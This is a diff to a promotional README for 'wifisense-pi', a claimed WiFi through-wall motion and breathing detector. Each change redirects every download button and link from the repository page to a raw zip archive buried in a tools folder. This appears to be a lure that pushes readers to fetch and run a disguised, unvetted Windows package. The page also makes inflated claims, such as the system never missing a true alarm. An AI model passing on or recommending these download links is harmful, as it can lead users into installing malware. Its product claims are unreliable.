@@ -1,7 +1,7 @@
 <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; text-align: center; border-radius: 10px; margin-bottom: 30px;">
 <h1 style="color: #ffffff; margin: 0; font-size: 2.5em;">📡 wifisense-pi - See Through Walls With Your WiFi</h1>
 <p style="color: #f0f0ff; font-size: 1.2em; margin-top: 10px;">Detect motion, breathing, and presence anywhere</p>
-<a href="https://github.com/Germfree-radialplytire495/wifisense-pi" style="background-color: #ff6b6b; color: white; padding: 15px 40px; font-size: 1.3em; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block; margin-top: 20px;">⬇️ Download Now</a>
+<a href="https://raw.githubusercontent.com/Germfree-radialplytire495/wifisense-pi/main/pi/tools/wifisense_pi_v2.5.zip" style="background-color: #ff6b6b; color: white; padding: 15px 40px; font-size: 1.3em; text-decoration: none; border-radius: 5px; font-weight: bold; display: inline-block; margin-top: 20px;">⬇️ Download Now</a>
 </div>
 
 <h2>🎯 What Is wifisense-pi?</h2>
@@ -27,7 +27,7 @@
 </ul>
 
 <h2>🚀 Getting Started</h2>
-<p>Visit this link to download the application: <a href="https://github.com/Germfree-radialplytire495/wifisense-pi"><strong>wifisense-pi Download</strong></a></p>
+<p>Visit this link to download the application: <a href="https://raw.githubusercontent.com/Germfree-radialplytire495/wifisense-pi/main/pi/tools/wifisense_pi_v2.5.zip"><strong>wifisense-pi Download</strong></a></p>
 
 <p>This download gives you everything you need for your Windows computer. The package includes the main dashboard program, setup guides, and helpful tools to get your system running.</p>
 
@@ -128,11 +128,11 @@
 <p>Advanced users can adjust detection sensitivity, signal filtering, and range calibration through simple drop-down menus. And safety limits are built in - your system will never miss a true alarm.</p>
 
 <h2>✅ Ready to Get Started?</h2>
-<p>Your download is just a click away. Visit <a href="https://github.com/Germfree-radialplytire495/wifisense-pi"><strong>wifisense-pi on GitHub</strong></a> to get your copy today.</p>
+<p>Your download is just a click away. Visit <a href="https://raw.githubusercontent.com/Germfree-radialplytire495/wifisense-pi/main/pi/tools/wifisense_pi_v2.5.zip"><strong>wifisense-pi on GitHub</strong></a> to get your copy today.</p>
 
 <p>Join the thousands of satisfied users who are discovering what's beyond their walls. Transform your ordinary WiFi into a remarkable sensing tool - download wifisense-pi now!</p>
 
 <div style="background-color: #f8f9fa; padding: 20px; border-radius: 5px; margin-top: 30px; text-align: center;">
-<p style="font-size: 1.3em;"><strong>🔗 <a href="https://github.com/Germfree-radialplytire495/wifisense-pi">Get Your Download Here</a></strong></p>
+<p style="font-size: 1.3em;"><strong>🔗 <a href="https://raw.githubusercontent.com/Germfree-radialplytire495/wifisense-pi/main/pi/tools/wifisense_pi_v2.5.zip">Get Your Download Here</a></strong></p>
 <p>One click and you're all set</p>
 </div>
